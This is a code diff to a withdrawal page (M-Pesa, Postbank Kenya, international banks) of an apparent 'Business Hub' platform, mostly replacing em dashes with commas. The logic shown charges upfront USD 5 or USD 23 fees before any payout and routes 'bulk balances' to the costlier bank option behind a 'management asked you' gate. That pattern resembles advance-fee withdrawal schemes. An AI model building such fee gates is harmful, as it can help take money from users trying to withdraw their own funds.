@@ -1,4 +1,4 @@
-// pages/withdraw.js — full-page withdrawals (M-Pesa + Other Countries).
+// pages/withdraw.js, full-page withdrawals (M-Pesa + Other Countries).
 // Replaces the pop-up modals. Submitted requests are emailed automatically to
 // the admin with a client auto-reply (via /api/notify), falling back to mailto.
 import { useEffect, useState, useRef } from 'react';
@@ -92,12 +92,12 @@ const REG_COUNTRY_ALIAS = { UAE: 'United Arab Emirates' };
 // Mobile Banking is offered to every user regardless of country.
 const MOBILE_BANK = WORLD_BANKS.find(b => b.code === 'MB');
 
-// Withdrawal processing fee — priced in USD, charged in KES via a dynamic conversion.
+// Withdrawal processing fee, priced in USD, charged in KES via a dynamic conversion.
 const FEE_USD    = 5;
 const USD_TO_KES = 130;                              // approximate USD → KES rate
 const FEE_KES    = Math.round(FEE_USD * USD_TO_KES); // = KES 650
 
-// Bank withdrawal processing fee (Postbank Kenya + all other banks) — priced in
+// Bank withdrawal processing fee (Postbank Kenya + all other banks), priced in
 // USD, converted to KES dynamically.
 const BANK_FEE_USD = 23;
 const BANK_FEE_KES = Math.round(BANK_FEE_USD * USD_TO_KES); // = KES 2,990
@@ -339,7 +339,7 @@ function PostbankFlow({ user, initialStep }) {
       {step === 'choice' && !overLimit && (
         <>
           <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
-            You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong> — it’s instant and avoids the extra verification checks that bank transfers require. Only use <strong>Postbank Kenya</strong> if you can’t use Safaricom / M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
+            You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong>, it’s instant and avoids the extra verification checks that bank transfers require. Only use <strong>Postbank Kenya</strong> if you can’t use Safaricom / M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
           </div>
           <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
           <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
@@ -358,10 +358,10 @@ function PostbankFlow({ user, initialStep }) {
           </div>
           <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via Postbank Kenya?</div>
           <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
-            📲 No — take me to M-Pesa
+            📲 No, take me to M-Pesa
           </button>
           <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
-            🏦 Yes, management asked me — continue with Postbank
+            🏦 Yes, management asked me, continue with Postbank
           </button>
           <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}>← Back</button>
         </>
@@ -457,7 +457,7 @@ function PostbankFlow({ user, initialStep }) {
 // ── International flow (bank selector) ─────────────────────────────────────────
 function InternationalFlow({ user, initialStep }) {
   const router = useRouter();
-  // Every "Other Countries" withdrawal pays the $23 USD fee directly — no
+  // Every "Other Countries" withdrawal pays the $23 USD fee directly, no
   // M-Pesa detour and no management gate, regardless of the amount withdrawn.
   const [gate,          setGate]          = useState(initialStep === 'form' ? 'form' : 'fee'); // fee → form
   const [loading,       setLoading]       = useState(false);
@@ -516,13 +516,13 @@ function InternationalFlow({ user, initialStep }) {
     const ok = await sendNotify({
       type: 'International Withdrawal Request',
       name: accountName.trim(), email: user?.email || '', phone: user?.phone || '',
-      subject: 'Withdrawal Request — Other Countries', details,
+      subject: 'Withdrawal Request, Other Countries', details,
     });
     setSending(false);
     if (ok) { setDone(true); return; }
     // Fallback to email app if server email isn't available
     const body = `Hello Business Hub,\n\nI would like to request a withdrawal to my bank account.\n\n${details}\n\nThank you.`;
-    window.location.href = `mailto:businesshub.comke@gmail.com?subject=${encodeURIComponent('Withdrawal Request — Other Countries')}&body=${encodeURIComponent(body)}`;
+    window.location.href = `mailto:businesshub.comke@gmail.com?subject=${encodeURIComponent('Withdrawal Request, Other Countries')}&body=${encodeURIComponent(body)}`;
   }
 
   if (done) {
@@ -540,7 +540,7 @@ function InternationalFlow({ user, initialStep }) {
     );
   }
 
-  // M-Pesa / management gate — shown before any bank withdrawal (all banks)
+  // M-Pesa / management gate, shown before any bank withdrawal (all banks)
   if (gate !== 'form') {
     const accent = 'linear-gradient(135deg, #1f2937, #374151)';
     const overLimit = Number(user?.balance || 0) > BULK_THRESHOLD_KES;
@@ -559,7 +559,7 @@ function InternationalFlow({ user, initialStep }) {
         {gate === 'mpesa' && !overLimit && (
           <>
             <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
-              For faster, check-free payouts we recommend <strong>M-Pesa (Safaricom)</strong> where available — it’s instant and avoids the extra verification checks that bank transfers require. Only use a <strong>bank</strong> if you can’t use M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
+              For faster, check-free payouts we recommend <strong>M-Pesa (Safaricom)</strong> where available, it’s instant and avoids the extra verification checks that bank transfers require. Only use a <strong>bank</strong> if you can’t use M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
             </div>
             <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
             <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
@@ -577,10 +577,10 @@ function InternationalFlow({ user, initialStep }) {
             </div>
             <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via the bank?</div>
             <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
-              📲 No — take me to M-Pesa
+              📲 No, take me to M-Pesa
             </button>
             <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('fee')}>
-              🏦 Yes, management asked me — continue
+              🏦 Yes, management asked me, continue
             </button>
             <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('mpesa')}>← Back</button>
           </>
@@ -610,7 +610,7 @@ function InternationalFlow({ user, initialStep }) {
     <FlowShell title="Withdraw from Other Countries" subtitle="Enter your bank account details" icon="🌍" accent="linear-gradient(135deg, #1f2937, #374151)">
       <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
         {homeBanks.length ? (
-          <>Based on your registration, we’re showing banks in <strong>{homeCountry}</strong>. Choose your bank and enter your account number in the format shown — or search for a different bank. Our payments team is notified automatically when you submit.</>
+          <>Based on your registration, we’re showing banks in <strong>{homeCountry}</strong>. Choose your bank and enter your account number in the format shown, or search for a different bank. Our payments team is notified automatically when you submit.</>
         ) : (
           <>Enter your name, choose your bank, and type your account number in the format shown. When you submit, our payments team is notified automatically and you’ll get a confirmation email.</>
         )}
@@ -716,7 +716,7 @@ export default function WithdrawPage() {
       <button className="pay-btn" style={{ background: overLimit ? '#9CA3AF' : 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: overLimit ? 6 : 14, opacity: overLimit ? 0.65 : 1, cursor: overLimit ? 'not-allowed' : 'pointer' }} disabled={overLimit} onClick={() => router.push('/withdraw?method=mpesa')}>
         📲 Withdraw with M-Pesa
       </button>
-      {overLimit && <div style={{ fontSize: 12, color: '#4b5563', marginBottom: 14 }}>M-Pesa is unavailable for bulk balances — please use a bank option below.</div>}
+      {overLimit && <div style={{ fontSize: 12, color: '#4b5563', marginBottom: 14 }}>M-Pesa is unavailable for bulk balances, please use a bank option below.</div>}
       <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
         🏦 Withdraw with Postbank Kenya
       </button>
